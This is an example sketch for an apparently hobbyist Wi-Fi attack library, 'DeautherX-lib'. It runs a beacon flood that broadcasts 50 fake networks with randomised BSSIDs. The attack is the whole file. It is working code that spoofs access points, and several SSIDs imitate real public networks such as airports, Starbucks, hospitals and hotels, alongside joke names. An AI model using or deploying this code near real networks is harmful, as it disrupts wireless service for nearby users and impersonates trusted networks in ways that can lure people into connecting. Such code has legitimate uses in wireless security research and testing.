/*
 * DeautherX-lib — Beacon Flood Example
 *
 * Creates 50 fake Wi-Fi networks visible to all nearby devices.
 * Half are open, half are WPA2 "encrypted" (but have no real password).
 */

#include <DeautherLib.h>

DeautherAttack attack;

void setup() {
    Serial.begin(115200);
    Serial.println(F("\n[BeaconFlood] Preparing SSID list..."));

    // Build the SSID list
    BeaconConfig cfg;

    // Add a mix of funny, scary, and realistic SSIDs
    const char* ssids[] = {
        "Free Airport WiFi", "Starbucks WiFi", "FBI Surveillance Van #3",
        "Pretty Fly For A WiFi", "Wu-Tang LAN", "The Promised LAN",
        "Hide Yo Kids Hide Yo WiFi", "Loading...", "404 Network Unavailable",
        "It Burns When IP", "Get Your Own WiFi", "Definitely Not A Virus",
        "Drop It Like Its Hotspot", "Searching...", "Connecting...",
        "Bill Wi the Science Fi", "Abraham Linksys", "Benjamin FrankLAN",
        "John Wilkes Bluetooth", "Martin Router King", "LAN Solo",
        "The LAN Before Time", "Virus Detected!", "Free iPhone 15",
        "Click Here For Free WiFi", "Google Free WiFi", "Hack Me If You Can",
        "TotallyLegitNetwork", "Skynet Global Defense", "Winternet Is Coming",
        "Watchdog Security", "Network Not Found", "Y U NO HAVE WIFI",
        "Test Network", "Company_Guest", "Hotel_Free_WiFi",
        "Airport_Terminal_B", "McDonalds_WiFi", "Subway_Free",
        "Bus_WiFi_Free", "Train_WiFi", "Library_Public",
        "University_Campus", "Hospital_Guest", "Museum_Free",
        "Park_WiFi", "City_Free_WiFi", "Metro_WiFi",
        "Conference_Room_A", "Guest_Network_5G"
    };

    for (int i = 0; i < 50; i++) {
        cfg.ssids.add(ssids[i], i % 2 == 0); // alternate WPA2 / Open
    }

    // Config
    cfg.pkt_rate  = 10;       // 10 beacons/sec per SSID
    cfg.wpa2      = false;    // Use per-SSID setting (from add() above)
    cfg.random_mac = true;    // Random BSSID each cycle

    Serial.print(F("[BeaconFlood] Starting beacon flood with "));
    Serial.print(cfg.ssids.count());
    Serial.println(F(" SSIDs"));

    attack.startBeacon(cfg);
}

void loop() {
    attack.update();

    static unsigned long last = 0;
    if (millis() - last > 3000) {
        attack.printStatus();
        last = millis();
    }
}
